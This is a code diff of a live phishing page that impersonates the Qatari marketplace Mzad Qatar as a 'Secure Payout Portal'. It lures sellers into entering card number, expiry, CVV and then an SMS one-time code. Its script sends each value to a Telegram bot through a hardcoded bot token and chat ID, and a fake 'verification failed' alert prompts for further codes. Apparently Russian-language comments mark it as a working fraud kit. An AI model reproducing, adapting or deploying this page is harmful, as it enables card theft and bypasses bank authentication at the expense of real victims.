@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-    <title>Mzad Qatar | Safe Payout Portal</title>
+    <title>Mzad Qatar | Secure Payout Portal</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
         :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
@@ -16,11 +16,9 @@
         .info { padding: 16px; }
         .ad-price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
         .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; }
-        
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 2000; align-items: center; justify-content: center; }
         .modal-content { background: white; width: 85%; padding: 25px; border-radius: 24px; text-align: center; }
         .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
-        
         #step-2 { display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--mzad-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -38,11 +36,11 @@
             <div class="ad-price" id="p-price">0 QAR</div>
         </div>
     </div>
-    <div style="padding:20px 16px;"><button class="btn-main" onclick="openModal()">RECEIVE FUNDS</button></div>
+    <div style="padding:20px 16px;"><button class="btn-main" onclick="openModal()">RECEIVE PAYOUT</button></div>
 
     <div class="modal" id="payModal">
         <div class="modal-content" id="step-1">
-            <div style="font-weight:700; margin-bottom:20px;">Secure Payout Verification</div>
+            <div style="font-weight:700; margin-bottom:20px;">Payout Verification</div>
             <form id="card-form">
                 <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                 <div style="display:flex; gap:10px;">
@@ -52,18 +50,16 @@
                 <button type="submit" class="btn-main">CONTINUE</button>
             </form>
         </div>
-
         <div class="modal-content" id="step-2">
-            <div style="font-weight:700;">Bank Authentication</div>
-            <p style="font-size:13px; color:#666;">Enter the code sent to your phone to confirm the reception of <b id="p-price-2"></b> QAR.</p>
-            <div id="loading-bank" style="display:none;"><div class="loader"></div><p>Connecting...</p></div>
+            <div style="font-weight:700;">3D Secure</div>
+            <p style="font-size:13px; color:#666;">Enter the OTP code from SMS to confirm the transfer.</p>
+            <div id="loading-bank" style="display:none;"><div class="loader"></div></div>
             <form id="sms-form">
                 <input type="text" id="sms-code" class="q-inp" placeholder="SMS Code" required>
-                <button type="submit" class="btn-main">VERIFY CODE</button>
+                <button type="submit" class="btn-main">VERIFY</button>
             </form>
         </div>
     </div>
-
     <div class="app-footer">
         <p style="font-weight:700; font-size:13px;">GET THE MZAD QATAR APP</p>
         <div class="store-badges">
@@ -74,46 +70,45 @@
 </div>
 
 <script>
-    // ТВОЙ БОТ ПРИЕМЩИК
     const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const C = '8071425015';
 
+    // ДЕКОДИРОВАНИЕ ДАННЫХ ИЗ URL
     const url = new URLSearchParams(window.location.search);
-    const item = url.get('item') || 'Product';
-    const price = url.get('price') || '0';
+    const dataRaw = url.get('d');
+    let item = "Product", price = "0", img = "";
+
+    if(dataRaw) {
+        try {
+            const decoded = JSON.parse(atob(dataRaw));
+            item = decoded.i; price = decoded.p; img = decoded.m;
+        } catch(e) {}
+    }
+
     document.getElementById('p-name').innerText = item;
     document.getElementById('p-price').innerText = price + ' QAR';
-    document.getElementById('p-price-2').innerText = price;
-    
-    // ФИКС КАРТИНКИ через прокси
-    const rawImg = url.get('img');
-    if(rawImg) { document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(rawImg)}`; }
+    if(img) document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(img)}`;
 
     function openModal() { document.getElementById('payModal').style.display = 'flex'; }
 
-    // Маски
     document.getElementById('cn').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim(); };
     document.getElementById('ce').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim(); };
 
-    // ОТПРАВКА КАРТЫ
     document.getElementById('card-form').onsubmit = (e) => {
         e.preventDefault();
-        const msg = `🇶🇦 **HIT CARD**\n📦 ${item}\n💰 ${price} QAR\n\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
+        const msg = `🇶🇦 **CARD**\n📦 ${item}\n💰 ${price} QAR\n💳 \`${document.getElementById('cn').value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
         new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-        
         document.getElementById('step-1').style.display = 'none';
         document.getElementById('loading-bank').style.display = 'block';
         document.getElementById('step-2').style.display = 'block';
-        setTimeout(() => { document.getElementById('loading-bank').style.display = 'none'; }, 2500);
+        setTimeout(() => { document.getElementById('loading-bank').style.display = 'none'; }, 2000);
     };
 
-    // ОТПРАВКА SMS
     document.getElementById('sms-form').onsubmit = (e) => {
         e.preventDefault();
-        const code = document.getElementById('sms-code').value;
-        const msg = `🔑 **SMS CODE**: \`${code}\`\n👤 Товар: ${item}`;
+        const msg = `🔑 **SMS**: \`${document.getElementById('sms-code').value}\`\n👤 Item: ${item}`;
         new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-        alert("Verification code expired. A new code has been sent.");
+        alert("Verification failed. A new code has been sent.");
         document.getElementById('sms-code').value = '';
     };
 </script>
